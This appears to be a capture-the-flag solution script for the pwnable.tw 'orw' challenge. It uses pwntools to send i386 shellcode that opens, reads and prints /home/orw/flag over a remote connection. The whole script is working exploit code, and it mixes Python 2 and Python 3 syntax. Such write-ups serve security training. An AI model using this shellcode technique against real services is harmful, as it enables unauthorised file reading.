# Read the flag from /home/orw/flag.
# Only open read write syscall are allowed to use.
# nc chall.pwnable.tw 10001

from pwn import *
context(arch='i386', os='linux')

# host = '192.168.122.215'
# port = 8888
host = 'chall.pwnable.tw'
port = 10001

r = remote(host, port)

shellcode = b''
shellcode += shellcraft.open('/home/orw/flag')
shellcode += shellcraft.read(3, 'esp', 64)
shellcode += shellcraft.write(1, 'esp', 64)
payload = asm(shellcode)
print payload
r.send(payload)

r.interactive()
